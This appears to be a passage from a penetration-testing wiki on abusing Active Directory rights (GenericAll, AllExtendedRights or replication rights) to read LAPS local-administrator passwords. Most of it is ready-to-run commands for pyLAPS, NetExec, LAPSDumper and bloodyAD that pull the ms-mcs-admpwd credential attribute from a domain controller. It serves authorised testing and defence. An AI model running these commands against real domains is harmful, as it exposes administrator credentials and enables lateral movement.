This abuse can be carried out when controlling an object that has `GenericAll or AllExtendedRights (or combination of GetChanges and (GetChangesInFilteredSet or GetChangesAll)` for domain-wise synchronization) over the target computer configured for LAPS. The attacker can then read the LAPS password of the computer account (i.e. the password of the computer's local administrator).
=== "UNIX-like"
    From UNIX-like systems, [pyLAPS](https://github.com/p0dalirius/pyLAPS) (Python) can be used to retrieve LAPS passwords.
    ```bash
    pyLAPS.py --action get -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --dc-ip "$DC_IP"
    ```
    Alternatively, NetExec also has this ability. In case it doesn't work this public module for CrackMapExec could also be used.
    ```bash
    # Default command
    nxc ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --module laps

    # The COMPUTER filter can be the name or wildcard (e.g. WIN-S10, WIN-* etc. Default: *)
    nxc ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --module laps -O computer="target-*"
    ```
    [LAPSDumper](https://github.com/n00py/LAPSDumper) is another Python alternative.
    ```bash
    python laps.py -u user -p password -d domain.local
    ```
    Alternatively, it can be achieved using bloodyAD
    ```bash
    bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
    ```
